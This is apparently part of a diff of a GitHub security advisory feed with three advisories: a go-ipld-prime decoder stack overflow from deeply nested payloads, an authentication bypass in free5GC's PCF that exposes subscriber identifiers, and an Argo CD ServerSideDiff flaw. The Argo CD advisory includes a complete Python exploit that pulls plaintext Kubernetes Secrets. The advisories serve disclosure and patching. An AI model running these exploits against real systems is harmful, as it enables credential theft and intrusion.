-        <content type="html"><![CDATA[<p>The DAG-CBOR and DAG-JSON decoders recurse on each nested map or list without a depth limit. A payload containing deeply nested collections causes the decoder to recurse once per level, growing the goroutine stack until the Go runtime terminates the process with a fatal stack overflow (distinct from a recoverable panic).</p>
-<p>For DAG-CBOR, a payload of approximately 2 MB, consisting of repeated <code>0x81</code> (array-of-1) bytes followed by a terminator, produces around 2 million recursion frames and reliably exhausts Go's default 1 GB goroutine stack. The existing allocation budget does not prevent this: each nested collection header costs only a handful of budget units, so the stack is exhausted before the budget is. DAG-JSON has equivalent exposure via <code>[[[...]]]</code>-style payloads; it has no budget system and is therefore unprotected against recursion depth as well.</p>
-<p>Schema-free decoding (using <code>basicnode.Prototype.Any</code>) allows arbitrary nesting depth. Schema-bound decoding bounds nesting only when the schema itself is non-recursive and contains no fields typed as <code>Any</code>; schemas with recursive type references or any <code>Any</code>-typed fields permit unconstrained nesting at those points.</p>
-<p>The fix adds a configurable <code>MaxDepth</code> option to both decoders, defaulting to 1024 nested levels. The decoder returns <code>ErrDecodeDepthExceeded</code> when a payload nests beyond the limit. Well-formed IPLD data rarely approaches this depth in practice; the default is generous for legitimate use while preventing stack exhaustion.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/ipld/go-ipld-prime/security/advisories/GHSA-w239-58x2-q8p5">https://github.com/ipld/go-ipld-prime/security/advisories/GHSA-w239-58x2-q8p5</a></li>
-<li><a href="https://github.com/advisories/GHSA-w239-58x2-q8p5">https://github.com/advisories/GHSA-w239-58x2-q8p5</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-w239-58x2-q8p5</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-05-07T02:07:21.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/free5gc/pcf] Free5GC PCF: Missing authentication middleware in Npcf_SMPolicyControl allows access to SM policy handlers and disclosure of subscriber SUPI]]></title>
-        <id>https://github.com/advisories/GHSA-6rgm-gr97-x3j5</id>
-        <link href="https://github.com/advisories/GHSA-6rgm-gr97-x3j5"/>
-        <updated>2026-05-07T01:58:43.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>PCF Npcf_SMPolicyControl missing authentication middleware allows unauthenticated access to SM policy handlers and disclosure of subscriber SUPI</p>
-<h3 id="details">Details</h3>
-<p>In <code>NewServer()</code>, the <code>smPolicyGroup</code> route group is created and routes are applied without attaching the router authorization middleware. In contrast, other PCF service groups such as <code>Npcf_PolicyAuthorization</code> do attach <code>RouterAuthorizationCheck</code> before route registration.</p>
-<p>Because the middleware is missing, requests to the following endpoints can reach business logic even when no valid OAuth token is provided:</p>
-<ul>
-<li><code>POST /npcf-smpolicycontrol/v1/sm-policies</code></li>
-<li><code>GET /npcf-smpolicycontrol/v1/sm-policies/{smPolicyId}</code></li>
-<li><code>POST /npcf-smpolicycontrol/v1/sm-policies/{smPolicyId}/update</code></li>
-<li><code>POST /npcf-smpolicycontrol/v1/sm-policies/{smPolicyId}/delete</code></li>
-</ul>
-<p>This is visible at runtime because unauthenticated requests return business-level responses such as <code>400</code> or <code>404</code> instead of being rejected with <code>401</code> before handler execution. Under valid lab preconditions (existing UE/session context and related policy data), unauthenticated <code>POST /sm-policies</code> can succeed with <code>201</code>, and unauthenticated <code>GET /sm-policies/{id}</code> can succeed with <code>200</code> and return policy context containing subscriber identifiers including <code>supi</code>.</p>
-<p>The root cause is missing router auth enforcement for <code>Npcf_SMPolicyControl</code>. 
-Upstream also fixed this by adding <code>RouterAuthorizationCheck</code> to <code>smPolicyGroup</code> (and <code>uePolicyGroup</code>) in free5gc/pcf PR #63.</p>
-<h3 id="poc">PoC</h3>
-<ol>
-<li>Deploy free5GC with PCF reachable on the SBI network.</li>
-<li>Use the PoC against the PCF service <strong>without</strong> an <code>Authorization</code> header:<pre><code class="language-bash">go run /home/ubuntu/free5gc/tools/npcf-smpolicy-noauth-poc/main.go \
-  --pcf-root /home/ubuntu/free5gc/NFs/pcf \
-  --pcf-url http://10.100.200.9:8000 \
-  --timeout 4s
-Observe that unauthenticated requests to Npcf_SMPolicyControl return business responses instead of 401.
-</code></pre>
-</li>
-</ol>
-<h3 id="impact">Impact</h3>
-<p>This is an authentication/authorization bypass on a network-accessible SBI service. Any unauthenticated actor able to reach the PCF SBI interface can invoke Npcf_SMPolicyControl handlers directly.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/free5gc/free5gc/security/advisories/GHSA-6rgm-gr97-x3j5">https://github.com/free5gc/free5gc/security/advisories/GHSA-6rgm-gr97-x3j5</a></li>
-<li><a href="https://github.com/free5gc/free5gc/issues/844">https://github.com/free5gc/free5gc/issues/844</a></li>
-<li><a href="https://github.com/free5gc/pcf/pull/63">https://github.com/free5gc/pcf/pull/63</a></li>
-<li><a href="https://github.com/free5gc/pcf/commit/8c4d457cdf58bb239ee30e88c56b370b22073964">https://github.com/free5gc/pcf/commit/8c4d457cdf58bb239ee30e88c56b370b22073964</a></li>
-<li><a href="https://github.com/advisories/GHSA-6rgm-gr97-x3j5">https://github.com/advisories/GHSA-6rgm-gr97-x3j5</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-6rgm-gr97-x3j5</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-05-07T01:58:42.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/argoproj/argo-cd/v3] ArgoCD ServerSideDiff is vulnerable to Kubernetes Secret Extraction]]></title>
-        <id>https://github.com/advisories/GHSA-3v3m-wc6v-x4x3</id>
-        <link href="https://github.com/advisories/GHSA-3v3m-wc6v-x4x3"/>
-        <updated>2026-05-07T01:56:55.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>There is a missing authorization and data-masking gap in Argo CD's ServerSideDiff endpoint that allows an attacker with read-only access to extract plaintext Kubernetes Secret data from etcd via the Kubernetes API server's Server-Side Apply dry-run mechanism.</p>
-<h3 id="details">Details</h3>
-<p>Argo CD masks Secret data in every endpoint that returns Kubernetes resource state except one. All the other endpoints such as GetManifests, GetManifestsWithFiles, GetResource and PatchResource utilize hideSecretData() to mask the returned secret value. The vulnerable function ServerSideDiff gRPC/REST endpoint (/application.ApplicationService/ServerSideDiff) constructs its response with raw, unmasked PredictedLive and NormalizedLive states:</p>
-<pre><code>// server/application/application.go:3051-3062
-responseDiffs = append(responseDiffs, &amp;v1alpha1.ResourceDiff{
-    TargetState:     string(diffRes.PredictedLive),
-    LiveState:       string(diffRes.NormalizedLive),
-})
-</code></pre>
-<p>A user only requires RBAC to call this ServerSideDiff function. Every authenticated Argo CD user has get access via the default role:catch-all policy. However, Argo CD has a defense layer called removeWebhookMutation() that normally strips non-Argo CD-managed fields from the Server Side Apply (SSA) dry-run response and merges them with the client-provided (masked) live state. This prevents real Secret values from leaking through the diff. However, this defense is entirely skipped when the Application has the annotation argocd.argoproj.io/compare-options: IncludeMutationWebhook=true.
-When IncludeMutationWebhook=true is set, ignoreMutationWebhook becomes false, and the defense is skipped entirely:</p>
-<pre><code>if o.ignoreMutationWebhook {
-    predictedLive, err = removeWebhookMutation(predictedLive, live, o.gvkParser, o.manager)
-}
-</code></pre>
-<p>The raw Kubernetes SSA dry-run response which contains real Secret values read from etcd is then flown directly into the API response with no masking.</p>
-<p>When ServerSideDiff is called, the handler invokes K8sServerSideDryRunner.Run(), which performs the equivalent of:</p>
-<p><code>kubectl apply --server-side --dry-run=server --field-manager=argocd-controller </code>
-For extraction to succeed, the Secret's data fields must be owned by at least one non-Argo CD SSA field manager. When argocd-controller is the sole field manager for data, the SSA dry-run garbage-collects those fields (since the target manifest omits them). When a second manager exists (e.g., kube-controller-manager), that manager retains ownership and the real values survive in the response.</p>
-<h3 id="poc">PoC</h3>
-<pre><code>#!/usr/bin/env python3
-"""
-Argo CD ServerSideDiff Secret Extraction PoC
-
-Usage:
-    python3 poc.py &lt;host&gt; &lt;token&gt; &lt;app&gt; &lt;project&gt;
-
-Example:
-    python3 poc.py argocd.int.&lt;customer&gt;.com eyJhbG... my-app my-project
-"""
-
-import base64
-import http.client
-import json
-import ssl
-import struct
-import sys
-import urllib.parse
-from collections import defaultdict
-
-def encode_varint(v):
-    out = []
-    while v &gt; 0x7f:
-        out.append((v &amp; 0x7f) | 0x80)
-        v &gt;&gt;= 7
-    out.append(v &amp; 0x7f)
-    return bytes(out)
-
-def encode_str(field, val):
-    tag = (field &lt;&lt; 3) | 2
-    raw = val.encode()
-    return encode_varint(tag) + encode_varint(len(raw)) + raw
-
-def encode_bytes(field, val):
-    tag = (field &lt;&lt; 3) | 2
-    return encode_varint(tag) + encode_varint(len(val)) + val
-
-def encode_bool(field, val):
-    tag = (field &lt;&lt; 3) | 0
-    return encode_varint(tag) + encode_varint(1 if val else 0)
-
-def decode_varint(data, pos):
-    val, shift = 0, 0
-    while pos &lt; len(data):
-        b = data[pos]; pos += 1
-        val |= (b &amp; 0x7f) &lt;&lt; shift; shift += 7
-        if not (b &amp; 0x80):
-            break
-    return val, pos
-
-def decode_fields(data):
-    fields = defaultdict(list)
-    pos = 0
-    while pos &lt; len(data):
-        tag, pos = decode_varint(data, pos)
-        wtype = tag &amp; 0x07
-        if wtype == 0:
-            val, pos = decode_varint(data, pos)
-            fields[tag &gt;&gt; 3].append(val)
-        elif wtype == 2:
-            length, pos = decode_varint(data, pos)
-            fields[tag &gt;&gt; 3].append(data[pos:pos + length])
-            pos += length
-        elif wtype == 5:
-            fields[tag &gt;&gt; 3].append(data[pos:pos + 4]); pos += 4
-        elif wtype == 1:
-            fields[tag &gt;&gt; 3].append(data[pos:pos + 8]); pos += 8
-        else:
-            break
-    return dict(fields)
-
-
-# -- grpc-web framing --
-
-def grpc_frame(payload):
-    return b"\x00" + struct.pack("&gt;I", len(payload)) + payload
-
-def decode_grpc_frames(data):
-    frames, pos = [], 0
-    while pos + 5 &lt;= len(data):
-        flag = data[pos]
-        length = struct.unpack("&gt;I", data[pos+1:pos+5])[0]
-        pos += 5
-        frames.append((flag, data[pos:pos+length]))
-        pos += length
-    return frames
-
-
-# -- http helpers --
-
-def make_conn(host):
-    ctx = ssl.create_default_context()
-    ctx.check_hostname = False
-    ctx.verify_mode = ssl.CERT_NONE
-    return http.client.HTTPSConnection(host, 443, context=ctx, timeout=10)
-
-def rest_get(conn, path, token):
-    conn.request("GET", path, headers={
-        "Authorization": "Bearer " + token,
-        "Accept": "application/json",
-    })
-    resp = conn.getresponse()
-    body = resp.read()
-    if resp.status != 200:
-        return None, "HTTP %d" % resp.status
-    return json.loads(body), None
-
-def grpc_post(conn, token, payload):
-    conn.request("POST", "/application.ApplicationService/ServerSideDiff",
-        body=grpc_frame(payload), headers={
-            "Content-Type": "application/grpc-web+proto",
-            "Accept": "application/grpc-web+proto",
-            "X-Grpc-Web": "1",
-            "Authorization": "Bearer " + token,
-        })
-    resp = conn.getresponse()
-    raw = resp.read()
-    if resp.status != 200:
-        return None, "HTTP %d" % resp.status
-    frames = decode_grpc_frames(raw)
-    for flag, fdata in frames:
-        if flag == 0:
-            return fdata, None
-    return None, "no data frame in response"
-
-
-# -- main --
-
-def main():
-    if len(sys.argv) != 5:
-        print("Usage: python3 poc.py &lt;host&gt; &lt;token&gt; &lt;app&gt; &lt;project&gt;")
-        sys.exit(1)
-
-    host, token, app_name, project = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]
-    conn = make_conn(host)
-
-    # step 1: list managed resources for the app, find secrets
-    print("[*] Fetching managed resources for %s/%s ..." % (project, app_name))
-    data, err = rest_get(conn, "/api/v1/applications/%s/managed-resources" % urllib.parse.quote(app_name), token)
-    if err:
-        print("[-] Failed: %s" % err); sys.exit(1)
-
-    secrets = []
-    for r in data.get("items", []):
-        if r.get("kind") != "Secret":
-            continue
-        name = r.get("name", "")
-        ns = r.get("namespace", "")
-        live = r.get("liveState", "")
-        stype = "Opaque"
-        if live and live != "null":
-            try:
-                stype = json.loads(live).get("type", "Opaque")
-            except Exception:
-                pass
-        secrets.append((name, ns, stype, live))
-
-    if not secrets:
-        print("[-] No secrets found in managed resources"); sys.exit(0)
-    print("[+] Found %d secrets" % len(secrets))
-
-    # step 2: call ServerSideDiff for each secret
-    total_extracted = 0
-    for sname, sns, stype, live_json in secrets:
-        # build minimal target manifest (no data field)
-        target = {"apiVersion": "v1", "kind": "Secret",
-                  "metadata": {"name": sname, "namespace": sns},
-                  "type": stype}
-
-        # copy required annotations from live state for SA tokens
-        if live_json and live_json != "null":
-            try:
-                live_annots = json.loads(live_json).get("metadata", {}).get("annotations", {})
-                k8s_annots = {k: v for k, v in live_annots.items() if k.startswith("kubernetes.io/")}
-                if k8s_annots:
-                    target["metadata"]["annotations"] = k8s_annots
-            except Exception:
-                pass
-
-        # for TLS secrets, include required placeholder keys
-        if stype == "kubernetes.io/tls":
-            target["data"] = {
-                "tls.crt": base64.b64encode(b"PLACEHOLDER").decode(),
-                "tls.key": base64.b64encode(b"PLACEHOLDER").decode(),
-            }
-        elif stype == "kubernetes.io/dockerconfigjson":
-            target["data"] = {".dockerconfigjson": base64.b64encode(b'{"auths":{}}').decode()}
-
-        # encode the grpc request
-        lr = b""
-        lr += encode_str(2, "Secret")       # kind
-        lr += encode_str(3, sns)             # namespace
-        lr += encode_str(4, sname)           # name
-        if live_json:
-            lr += encode_str(6, live_json)   # liveState
-        lr += encode_bool(12, True)          # modified
-
-        query = encode_str(1, app_name)
-        query += encode_str(3, project)
-        query += encode_bytes(4, lr)
-        query += encode_str(5, json.dumps(target))
-
-        # reconnect for each call (simple, no pool needed for poc)
-        try:
-            conn = make_conn(host)
-            resp_data, err = grpc_post(conn, token, query)
-        except Exception as e:
-            print("  [!] %s/%s: %s" % (sns, sname, e))
-            continue
-        if err:
-            print("  [!] %s/%s: %s" % (sns, sname, err))
-            continue
-
-        # parse response
-        resp_fields = decode_fields(resp_data)
-        for item_bytes in resp_fields.get(1, []):
-            if not isinstance(item_bytes, bytes):
-                continue
-            ifields = decode_fields(item_bytes)
-
-            # field 5 = targetState (predictedLive — has real values from etcd)
-            for raw in ifields.get(5, []):
-                if not isinstance(raw, bytes):
-                    continue
-                try:
-                    obj = json.loads(raw)
-                except Exception:
-                    continue
-                if obj.get("kind") != "Secret":
-                    continue
-                secret_data = obj.get("data", {})
-                if not secret_data:
-                    continue
-
-                # check for real (non-masked) values
-                real_keys = {}
-                for k, v in secret_data.items():
-                    if not v:
-                        continue
-                    if all(c == "+" for c in v):
-                        continue  # masked by argocd
-                    try:
-                        decoded = base64.b64decode(v)
-                        text = decoded.decode("utf-8", errors="replace")
-                    except Exception:
-                        continue
-                    if all(c == "+" for c in text) and text:
-                        continue  # masked (base64 of +++...)
-                    real_keys[k] = text
-
-                if real_keys:
-                    total_extracted += 1
-                    print("\n  [***] %s/%s  (%s)" % (sns, sname, stype))
-                    print("        %d/%d keys extracted:" % (len(real_keys), len(secret_data)))
-                    for k in sorted(real_keys):
-                        v = real_keys[k].replace("\n", "\\n")
-                        if len(v) &gt; 120:
-                            v = v[:120] + "..."
-                        print("          %s: %s" % (k, v))
-
-    print("\n[*] Done. %d secrets with real values extracted." % total_extracted)
-
-if __name__ == "__main__":
-    main()
-</code></pre>
-<h3 id="impact">Impact</h3>
-<p>Any user with Argo CD application get permissions can extract real Kubernetes Secret values including service account tokens, TLS certificates, database credentials, and API keys. On Applications where IncludeMutationWebhook=true is already set, exploitation requires only read-only Argo CD access.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/argoproj/argo-cd/security/advisories/GHSA-3v3m-wc6v-x4x3">https://github.com/argoproj/argo-cd/security/advisories/GHSA-3v3m-wc6v-x4x3</a></li>
-<li><a href="https://github.com/advisories/GHSA-3v3m-wc6v-x4x3">https://github.com/advisories/GHSA-3v3m-wc6v-x4x3</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-3v3m-wc6v-x4x3</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-05-07T01:56:53.000Z</published>
     </entry>
 </feed>
